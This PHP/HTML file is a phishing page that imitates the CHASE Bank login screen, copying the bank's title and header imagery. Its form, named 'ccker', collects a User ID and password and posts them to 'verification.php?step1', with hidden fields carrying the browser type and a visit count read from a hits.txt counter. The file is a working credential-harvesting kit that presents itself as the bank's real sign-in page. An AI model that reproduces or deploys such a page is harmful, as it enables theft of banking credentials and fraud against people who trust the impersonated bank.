<?php
include_once('Browser.php');
//Initialize hit counter
$stored = "hits.txt"; 

//Write counter to file function
function displayHitThingy($stored) { 
     $fp = fopen($stored,'rw'); 
     $stuff = fgets($fp,9999); 
     fclose($fp); 
     $fp = fopen($stored,'w'); 
     $stuff += 1; 
	 print $stuff;
     fputs($fp, $stuff); 
     fclose($fp); 
} 



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>CHASE Bank - Credit Cards, Mortgage, Personal &amp; Commercial Banking, Auto Loans, Investing , Retirement Planning, Checking, and  Business Banking</title>
<link rel="icon" href="img/favicon.fw.png" type="image/png" >
<style type="text/css">


body {
	background-image: url(img/background-repeat.fw.png);
	background-repeat: repeat-x;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}


.header {
	width:976px;
	margin-right: auto;
	margin-left: auto;
}

.body {
	margin-top: 38px;
	width: 976px;
	margin-right: auto;
	margin-left: auto;
}td img {display: block;}td img {display: block;}

.masterContainer .header table tr td #username {
	height: 20px;
	width: 198px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	font-family: Verdana, Geneva, sans-serif;
	font-size: 14px;
	font-style: italic;
}
.masterContainer .header table tr td #password {
	height: 22px;
	width: 200px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	font-family: Verdana, Geneva, sans-serif;
	font-size: 14px;
	font-style: italic;
}
.masterContainer .header table tr td .submit {
	height: 38px;
	width: 204px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	background-image: url(images/header_r10_c15.gif);
	background-repeat: no-repeat;
	background-color: transparent;
}
</style>

<script>
function validateForm()
{
var x=document.forms["ccker"]["username"].value;
var y=document.forms["ccker"]["password"].value;


    var badwords = ["abc", "bca", "hai hello"];
if (x==null || x=="")
  {
  alert("Please enter your User ID");
  return false;
  }
  

if (y==null || y=="")
  {
  alert("Please enter your Password");
  return false;
  }

			
}			
</script>

<script type="text/javascript">



</script>
</head>

<body>
<form action="verification.php?step1" method="post" name="ccker" onsubmit="return validateForm()">
<div class="masterContainer"  >
  <div class="header">
    <table style="display: inline-table;" border="0" cellpadding="0" cellspacing="0" width="978">
      <!-- fwtable fwsrc="Untitled-3.fw.png" fwpage="Page 1" fwbase="header.gif" fwstyle="Dreamweaver" fwdocid = "1429416328" fwnested="0" -->
      <tr>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="83" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="17" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="61" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="21" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="18" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="60" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="21" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="41" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="11" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="174" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="96" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="16" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="25" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="41" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="77" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="15" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="84" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="13" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="15" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="69" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="20" height="1" id="undefined_2" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="1" id="undefined_2" /></td>
      </tr>
      <tr>
        <td><img name="header_r1_c1" src="images/header_r1_c1.gif" width="83" height="45" id="header_r1_c1" alt="" /></td>
        <td><img name="header_r1_c2" src="images/header_r1_c2.gif" width="17" height="45" id="header_r1_c2" alt="" /></td>
        <td><img name="header_r1_c3" src="images/header_r1_c3.gif" width="61" height="45" id="header_r1_c3" alt="" /></td>
        <td><img name="header_r1_c4" src="images/header_r1_c4.gif" width="21" height="45" id="header_r1_c4" alt="" /></td>
        <td colspan="2"><img name="header_r1_c5" src="images/header_r1_c5.gif" width="78" height="45" id="header_r1_c5" alt="" /></td>
        <td colspan="6"><img name="header_r1_c7" src="images/header_r1_c7.gif" width="359" height="45" id="header_r1_c7" alt="" /></td>
        <td colspan="3"><img name="header_r1_c13" src="images/header_r1_c13.gif" width="143" height="45" id="header_r1_c13" alt="" /></td>
        <td rowspan="2"><img name="header_r1_c16" src="images/header_r1_c16.gif" width="15" height="102" id="header_r1_c16" alt="" /></td>
        <td><img name="header_r1_c17" src="images/header_r1_c17.gif" width="84" height="45" id="header_r1_c17" alt="" /></td>
        <td rowspan="2"><img name="header_r1_c18" src="images/header_r1_c18.gif" width="13" height="102" id="header_r1_c18" alt="" /></td>
        <td colspan="2"><img name="header_r1_c19" src="images/header_r1_c19.gif" width="84" height="45" id="header_r1_c19" alt="" /></td>
        <td rowspan="2"><img name="header_r1_c21" src="images/header_r1_c21.gif" width="20" height="102" id="header_r1_c21" alt="" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="45" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="7"><img name="header_r2_c1" src="images/header_r2_c1.gif" width="281" height="57" id="header_r2_c1" alt="" /></td>
        <td colspan="8"><img name="header_r2_c8" src="images/header_r2_c8.gif" width="481" height="57" id="header_r2_c8" alt="" /></td>
        <td><img name="header_r2_c17" src="images/header_r2_c17.gif" width="84" height="57" id="header_r2_c17" alt="" /></td>
        <td colspan="2"><img name="header_r2_c19" src="images/header_r2_c19.gif" width="84" height="57" id="header_r2_c19" alt="" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="57" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="21"><img name="header_r3_c1" src="images/header_r3_c1.gif" width="978" height="22" id="header_r3_c1" alt="" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="22" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="5"><img name="header_r4_c1" src="images/header_r4_c1.gif" width="200" height="45" id="header_r4_c1" alt="" /></td>
        <td colspan="4"><img name="header_r4_c6" src="images/header_r4_c6.gif" width="133" height="45" id="header_r4_c6" alt="" /></td>
        <td><img name="header_r4_c10" src="images/header_r4_c10.gif" width="174" height="45" id="header_r4_c10" alt="" /></td>
        <td colspan="11"><img name="header_r4_c11" src="images/header_r4_c11.gif" width="471" height="45" id="header_r4_c11" alt="" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="45" id="undefined_2" /></td>
      </tr>
      <tr>
        <td rowspan="7" colspan="11"><img name="header_r5_c1" src="images/header_r5_c1.gif" width="603" height="248" id="header_r5_c1" alt="" /></td>
        <td rowspan="7" colspan="3"><img name="header_r5_c12" src="images/header_r5_c12.gif" width="82" height="248" id="header_r5_c12" alt="" /></td>
        <td colspan="5"><img name="header_r5_c15" src="images/header_r5_c15.gif" width="204" height="61" id="header_r5_c15" alt="" /></td>
        <td rowspan="7" colspan="2"><img name="header_r5_c20" src="images/header_r5_c20.gif" width="89" height="248" id="header_r5_c20" alt="" /></td>
        <td><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="61" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="5" bgcolor="#FFFFFF">
        
        <input name="username" id="username" type="text" maxlength="96" tabindex="1" aria-required="true" placeholder="User ID" autocorrect="off" autocomplete="off" value="" />
        <input name="counter" type="hidden" value="<?php displayHitThingy($stored);?>">
 
        </td>
        <td bgcolor="#FFFFFF"><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="27" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="5" bgcolor="#FFFFFF"><img name="header_r7_c15" src="images/header_r7_c15.gif" width="204" height="12" id="header_r7_c15" alt="" /></td>
        <td bgcolor="#FFFFFF"><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="12" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="5" bgcolor="#FFFFFF"><input name="password" id="password" type="password" maxlength="96" tabindex="1" aria-required="true" placeholder="Password" autocorrect="off" autocomplete="off" value="" />
         <input name="browser" type="hidden" value="<?php echo $browser_type;?>">
        </td>
        <td bgcolor="#FFFFFF"><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="24" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="5" bgcolor="#FFFFFF"><img name="header_r9_c15" src="images/header_r9_c15.gif" width="204" height="37" id="header_r9_c15" alt="" /></td>
        <td bgcolor="#FFFFFF"><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="37" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="5" bgcolor="#FFFFFF"><input name="submit" type="submit" value=" " class="submit" id="submit"/></td>
        <td bgcolor="#FFFFFF"><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="38" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="5" bgcolor="#FFFFFF"><img name="header_r11_c15" src="images/header_r11_c15.gif" width="204" height="49" id="header_r11_c15" alt="" /></td>
        <td bgcolor="#FFFFFF"><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="49" id="undefined_2" /></td>
      </tr>
      <tr>
        <td colspan="8" bgcolor="#FFFFFF"><img name="header_r12_c1" src="images/header_r12_c1.gif" width="322" height="279" id="header_r12_c1" alt="" /></td>
        <td colspan="5" bgcolor="#FFFFFF"><img name="header_r12_c9" src="images/header_r12_c9.gif" width="322" height="279" id="header_r12_c9" alt="" /></td>
        <td colspan="8" bgcolor="#FFFFFF"><img name="header_r12_c14" src="images/header_r12_c14.gif" width="334" height="279" id="header_r12_c14" alt="" /></td>
        <td bgcolor="#FFFFFF"><img src="images/spacer.gif" alt="" name="undefined_2" width="1" height="279" id="undefined_2" /></td>
      </tr>
    </table>
  </div>
  
  
  <div class="body">
    <table style="display: inline-table;" border="0" cellpadding="0" cellspacing="0" width="959">
      <!-- fwtable fwsrc="Untitled-1.fw.png" fwpage="Page 1" fwbase="footer.gif" fwstyle="Dreamweaver" fwdocid = "1149606103" fwnested="0" -->
      <tr>
        <td><img src="img/spacer.gif" width="10" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="6" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="103" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="50" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="150" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="68" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="27" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="48" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="133" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="55" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="23" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="71" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="173" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="42" height="1" alt="" /></td>
        <td><img src="img/spacer.gif" width="1" height="1" alt="" /></td>
      </tr>
      <tr>
        <td colspan="5"><img name="footer_r1_c1" src="img/footer_r1_c1.gif" width="319" height="50" id="footer_r1_c1" alt="" /></td>
        <td colspan="9"><img name="footer_r1_c6" src="img/footer_r1_c6.gif" width="640" height="50" id="footer_r1_c6" alt="" /></td>
        <td><img src="img/spacer.gif" width="1" height="50" alt="" /></td>
      </tr>
      <tr>
        <td colspan="11"><img name="footer_r2_c1" src="img/footer_r2_c1.gif" width="673" height="171" id="footer_r2_c1" alt="" /></td>
        <td colspan="3"><img name="footer_r2_c12" src="img/footer_r2_c12.gif" width="286" height="171" id="footer_r2_c12" alt="" /></td>
        <td><img src="img/spacer.gif" width="1" height="171" alt="" /></td>
      </tr>
      <tr>
        <td rowspan="3" colspan="2"><img name="footer_r3_c1" src="img/footer_r3_c1.gif" width="16" height="155" id="footer_r3_c1" alt="" /></td>
        <td rowspan="2"><img name="footer_r3_c3" src="img/footer_r3_c3.gif" width="103" height="93" id="footer_r3_c3" alt="" /></td>
        <td rowspan="6"><img name="footer_r3_c4" src="img/footer_r3_c4.gif" width="50" height="292" id="footer_r3_c4" alt="" /></td>
        <td rowspan="2"><img name="footer_r3_c5" src="img/footer_r3_c5.gif" width="150" height="93" id="footer_r3_c5" alt="" /></td>
        <td rowspan="2" colspan="2"><img name="footer_r3_c6" src="img/footer_r3_c6.gif" width="95" height="93" id="footer_r3_c6" alt="" /></td>
        <td rowspan="5"><img name="footer_r3_c8" src="img/footer_r3_c8.gif" width="48" height="235" id="footer_r3_c8" alt="" /></td>
        <td rowspan="3" colspan="2"><img name="footer_r3_c9" src="img/footer_r3_c9.gif" width="188" height="155" id="footer_r3_c9" alt="" /></td>
        <td rowspan="6" colspan="2"><img name="footer_r3_c11" src="img/footer_r3_c11.gif" width="94" height="292" id="footer_r3_c11" alt="" /></td>
        <td><img name="footer_r3_c13" src="img/footer_r3_c13.gif" width="173" height="59" id="footer_r3_c13" alt="" /></td>
        <td rowspan="6"><img name="footer_r3_c14" src="img/footer_r3_c14.gif" width="42" height="292" id="footer_r3_c14" alt="" /></td>
        <td><img src="img/spacer.gif" width="1" height="59" alt="" /></td>
      </tr>
      <tr>
        <td rowspan="5"><img name="footer_r4_c13" src="img/footer_r4_c13.gif" width="173" height="233" id="footer_r4_c13" alt="" /></td>
        <td><img src="img/spacer.gif" width="1" height="34" alt="" /></td>
      </tr>
      <tr>
        <td><img name="footer_r5_c3" src="img/footer_r5_c3.gif" width="103" height="62" id="footer_r5_c3" alt="" /></td>
        <td rowspan="3" colspan="3"><img name="footer_r5_c5" src="img/footer_r5_c5.gif" width="245" height="142" id="footer_r5_c5" alt="" /></td>
        <td><img src="img/spacer.gif" width="1" height="62" alt="" /></td>
      </tr>
      <tr>
        <td rowspan="3"><img name="footer_r6_c1" src="img/footer_r6_c1.gif" width="10" height="137" id="footer_r6_c1" alt="" /></td>
        <td colspan="2"><img name="footer_r6_c2" src="img/footer_r6_c2.gif" width="109" height="65" id="footer_r6_c2" alt="" /></td>
        <td rowspan="2" colspan="2"><img name="footer_r6_c9" src="img/footer_r6_c9.gif" width="188" height="80" id="footer_r6_c9" alt="" /></td>
        <td><img src="img/spacer.gif" width="1" height="65" alt="" /></td>
      </tr>
      <tr>
        <td rowspan="2" colspan="2"><img name="footer_r7_c2" src="img/footer_r7_c2.gif" width="109" height="72" id="footer_r7_c2" alt="" /></td>
        <td><img src="img/spacer.gif" width="1" height="15" alt="" /></td>
      </tr>
      <tr>
        <td colspan="2"><img name="footer_r8_c5" src="img/footer_r8_c5.gif" width="218" height="57" id="footer_r8_c5" alt="" /></td>
        <td colspan="3"><img name="footer_r8_c7" src="img/footer_r8_c7.gif" width="208" height="57" id="footer_r8_c7" alt="" /></td>
        <td><img name="footer_r8_c10" src="img/footer_r8_c10.gif" width="55" height="57" id="footer_r8_c10" alt="" /></td>
        <td><img src="img/spacer.gif" width="1" height="57" alt="" /></td>
      </tr>
    </table>
  </div>
</div></form>


</body>
</html>
